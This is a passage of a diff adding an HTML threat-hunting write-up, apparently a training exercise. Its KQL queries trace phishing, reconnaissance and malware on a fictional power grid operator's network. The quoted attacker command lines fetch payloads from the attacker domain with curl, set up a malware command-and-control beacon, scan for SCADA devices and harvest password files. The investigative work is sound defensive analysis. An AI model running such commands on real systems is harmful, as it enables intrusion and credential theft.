+| where domain == "chicagogridupdates.com"
+| distinct ip;
+let bad_domains =
+PassiveDns
+| where ip in (bad_ips)
+| distinct domain;
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)
+| where recipient endswith "chicagopowergrid.com"
+| distinct recipient
+| lookup Employees on $left.recipient == $right.email_addr
+| distinct username
+| lookup AuthenticationEvents on $left.username == $right.username
+| where timestamp between (datetime(2024-08-26 09:08:20.0000) .. datetime(2024-09-06))
+| where src_ip !startswith "10.10.0" //internal company ip
+and src_ip in (bad_ips)
+| where result =~ "successful login"
+| summarize count() by timestamp, username, src_ip</kbd></pre>
+          <details open id="results9">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>username</th>
+                    <th>src_ip</th>
+                    <th>count_</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-27 02:40:47.0000</td>
+                    <td>elnunmaker</td>
+                    <td>104.244.42.129</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 04:17:19.0000</td>
+                    <td>joeisenman</td>
+                    <td>87.250.252.242</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 10:54:24.0000</td>
+                    <td>kajackson</td>
+                    <td>87.250.252.242</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:22:52.0000</td>
+                    <td>stmcgrath</td>
+                    <td>87.250.252.242</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-02 02:51:36.0000</td>
+                    <td>ratyler</td>
+                    <td>104.244.42.129</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-03 02:04:06.0000</td>
+                    <td>jefoley</td>
+                    <td>87.250.252.242</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-03 04:02:11.0000</td>
+                    <td>altorres</td>
+                    <td>104.244.42.129</td>
+                    <td>1</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Despite having access to 7 distinct employee accounts, the threat actors only focused on using Nunmaker's and Eisenman's accounts to send malware to the only currently employed SCADA operator.</p>
+          <p>But how did they know who to target? There must be signs of recon in the <samp>InboundNetworkEvents</samp> table.</p>}
+          <pre><kbd>let bad_ips =
+PassiveDns
+| where domain == "chicagogridupdates.com"
+| distinct ip;
+let bad_domains =
+PassiveDns
+| where ip in (bad_ips)
+| distinct domain;
+InboundNetworkEvents
+| where src_ip in (bad_ips)</kbd></pre>
+          <details open id="results10">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>src_ip</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                    <th>referrer</th>
+                    <th>status_code</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-25 00:00:00.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DBryan%2BQuillen%2BCEO</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 03:52:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DKell%2BDuda%2BIT%2BAdministrator</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 04:06:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DKevin%2BNguyen%2BIT%2BAdministrator</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 04:56:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DJason%2BOh%2BIT%2BAdministrator</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 05:44:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DWaymon%2BHo%2BSCADA%2BAdministrator</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 06:19:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DJibby%2BSaetang%2BSCADA%2BOperator</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 06:52:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DWade%2BWells%2BSCADA%2BOperator</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 07:37:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DGreg%2BSchloemer%2BNetwork%2BAdministrator</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 07:52:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DMaya%2BOmere%2BCybersecurity%2BAnalyst</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 08:17:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DKatie%2BLedoux%2BLegal%2BCounsel</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 08:20:40.0000</td>
+                    <td>GET</td>
+                    <td>87.250.252.242</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/company_directory</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 09:18:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/executive_team_bios</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 09:31:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/IT/network_diagrams/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 09:56:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/IT/system_configurations/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 10:45:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/SCADA/system_overview/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 11:00:40.0000</td>
+                    <td>GET</td>
+                    <td>87.250.252.242</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/employee_profiles/Bryan_Quillen/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 11:54:40.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/employee_profiles/Kell_Duda/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 03:49:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/employee_profiles/Waymon_Ho/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 04:09:28.0000</td>
+                    <td>GET</td>
+                    <td>87.250.252.242</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/employee_profiles/Greg_Schloemer/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 04:56:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/employee_profiles/Maya_Omere/</td>
+                    <td>https://www.darkwebhackersforum.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 05:42:28.0000</td>
+                    <td>GET</td>
+                    <td>87.250.252.242</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/news/employee-of-the-month/</td>
+                    <td>https://www.supernicehackerbros.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 06:03:28.0000</td>
+                    <td>GET</td>
+                    <td>87.250.252.242</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/news/articles/simeon-kakpovi-employee-of-the-month/</td>
+                    <td>https://www.supernicehackerbros.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 06:07:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/public-relations/top-10-reasons-our-ceo-is-awesome/</td>
+                    <td>https://www.supernicehackerbros.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 06:21:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/public-relations/ceo-bryan-quillen-helps-local-kids/</td>
+                    <td>https://www.supernicehackerbros.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 07:05:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/public-relations/ceo-bryan-quillen-huge-animal-shelter-donation/</td>
+                    <td>https://www.supernicehackerbros.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 07:48:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/public-relations/ceo-bryan-quillen-community-outreach/</td>
+                    <td>https://www.supernicehackerbros.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 08:31:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/events/upcoming-corporate-karaoke-night/</td>
+                    <td>https://www.supernicehackerbros.com</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 09:21:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DChicago%2Bgrid%2Bsystem%2Barchitecture</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 10:03:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DSCADA%2Bnetwork%2Btopology</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 10:50:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DChicago%2Bgrid%2Bvulnerability%2Bassessments</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-27 11:25:28.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DDisaster%2Brecovery%2Bplans</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 04:46:47.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DEmergency%2Bshutdown%2Bprocedures</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 05:12:47.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DIT%2Bdepartment%2Bcontacts</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 05:56:47.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DIncident%2Bresponse%2Bplaybook</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 06:10:47.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DRecent%2Bsecurity%2Baudits</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 06:44:47.0000</td>
+                    <td>GET</td>
+                    <td>104.244.42.129</td>
+                    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1; rv:1.9.5.20) Gecko/2021-05-22 21:31:56 Firefox/10.0</td>
+                    <td>https://chicagopowergrid.com/search%3DPower%2Bgrid%2Bhacking</td>
+                    <td>https:chicagopowergrid.com/search</td>
+                    <td>200</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The threat actors looked up information on various employees: Bryan Quillen (CEO), Kell Duda (IT Administrator), Kevin Nguyen (IT Administrator), Jason Oh (IT Administrator), Waymon Ho (SCADA Administrator), Jibby Saetang (SCADA Operator), Wade Wells (SCADA Operator), Greg Schloemer (Network Administrator), Maya Omere (Cybersecurity Analyst), Katie Ledoux (Legal Counsel), and Simeon Kakpovi (Physical Security Specialist). They also looked up information on the CEO's community outreach and social work, the employee of the month page, upcoming employee-focused social events, the IT department's contact information, and technical information on Chicago's power grid (such as known vulnerabilities, incident response plans, and disaster recovery plans).</p>
+          <p>The threat actor might've done something else in Jibby's computer (and by extension, across the SCADA devices in the network); particularly given the scale and sophistication of the attack, they could've attempted to destroy evidence of their tampering or to impede recovery efforts (such as destroying backups).</p>
+          <pre><kbd>ProcessEvents
+| where username == "jisaetang"
+| where timestamp >= datetime(2024-08-29 08:25:00.0000)
+| where process_commandline !contains "SystemApps"
+and process_commandline !contains "WindowsApps"
+and process_commandline !contains "Teams"
+and process_commandline !contains "Office"
+and process_commandline !contains "msedge.exe"</kbd></pre>
+          <details open id="results11">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-29 08:28:44.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>1f7092652db29849bd34d477d9e78c8c093235aaea02e2e7498f516159d010ed</td>
+                    <td>Explorer.exe "C:\Users\jisaetang\Downloads\Urgent_Cyber_Threat_Alert.zip"</td>
+                    <td>Explorer.exe</td>
+                    <td>cc1a126e49b5df316a82acc9a8075e9d46126a5af1745856eeb19f4d37e5adae</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 08:28:45.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>3eb1923ca66cb1120b777787181b90b2ea839120ea5474d66b9f60d74002da54</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>1624b5f54a285c08cacc24ddb7256ea082802f7934ccc142556c88800fb701ee</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 08:49:45.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24</td>
+                    <td>cmd.exe</td>
+                    <td>94886fa6ac36170d2648c6f86a6386625a61998706dae22569a34f770f087bde</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 09:09:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>tasklist /svc</td>
+                    <td>cmd.exe</td>
+                    <td>f7350e5dfbe47157f24620a2291ab1c58aeb28d7d3ad090eeadf15a6d58c6bba</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:08:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>systeminfo</td>
+                    <td>cmd.exe</td>
+                    <td>3126a042d8c823281061cb26690264dc2924674ce01282044533bf1196ac56b3</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:16:28.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>ed486cfac9aa7ff67b70511465e3787c27f9b9f20489da4281c00971d3ac2b92</td>
+                    <td>Explorer.exe "C:\Users\jisaetang\Downloads\Grid_Security_Update.zip"</td>
+                    <td>Explorer.exe</td>
+                    <td>efaa4093c2b3d48bc6b05a2266063eac8f302c8f4d019c3d9030397de3ac9ba3</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:16:29.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>1dde3d7372c1746d177e3dbd87dcd572fbc19ba618d29ba4352e2df8fa3f7a82</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>209c373fa7b5bce7ac12542f7838ee1a27bc721e5560736671deb45911aab130</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:17:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24</td>
+                    <td>cmd.exe</td>
+                    <td>09f401305faa04d1b9e3f66400741858e9ecde3e509ccf41df91f60ff20e5a9d</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:44:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net user</td>
+                    <td>cmd.exe</td>
+                    <td>b8bfba65325a0b5418bdd788c07f2377fce5939b7b707be301a74cf3963561c4</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 11:02:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>nltest /dclist:chicagogrid.local</td>
+                    <td>cmd.exe</td>
+                    <td>1ac90380ff886ae5b23e2e51a9aba02f673f5458f4b45d47fc7105a6532936dc</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 11:41:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wmic product get name,version</td>
+                    <td>cmd.exe</td>
+                    <td>74b4ccee0c456cfbf37afe5af45ab4ce7d58a974dd60b3a63572ae01aae6c4a8</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-30 02:08:36.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wmic service list brief</td>
+                    <td>cmd.exe</td>
+                    <td>2d8ee532ae246c1d4793cf8d78f803a6cd1dfb4aa5ae4c72874814f4a09b94f7</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-08 10:12:24.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>curl -o C:\ProgramData\ICSScanner.exe http://chicagogridupdates.com/ICSScanner.exe</td>
+                    <td>cmd.exe</td>
+                    <td>bbc985b4342c141e8111945ec1e79edbec2dc3f8bd9471601d7314b350b8a19a</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-09 11:17:44.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>C:\ProgramData\ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt</td>
+                    <td>cmd.exe</td>
+                    <td>462a705acf1baad147fe968adcb43d7b55ed40d7f7f5ac98c170d2bb517ee77b</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 02:18:57.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>dir /s /b C:\*password*.txt > C:\ProgramData\Password_Files.txt</td>
+                    <td>cmd.exe</td>
+                    <td>fe1c829b6270b386ac49a55de407d147ea49ec17dc83b173d93c5feddcdd633d</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 02:53:57.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1,2 delims=:' %i in (C:\ProgramData\Password_Files.txt) do findstr /I /M /C:"password" %i >> C:\ProgramData\Extracted_Password.txt</td>
+                    <td>cmd.exe</td>
+                    <td>77c83e68bee106401956a46b268e9b84d4b875b2def5454a6e7d0f6b2b256f78</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 03:43:57.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>curl -o C:\ProgramData\SCADA_Malicious_Commands.txt http://chicagogridupdates.com/SCADA_Malicious_Commands.txt</td>
+                    <td>cmd.exe</td>
+                    <td>ab08a7e519afdd3ed06d07f355b1c913bf79d2fc6538a108ccacf6db2b7d9eff</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:01:57.0000</td>
+                    <td>cmd.exe</td>
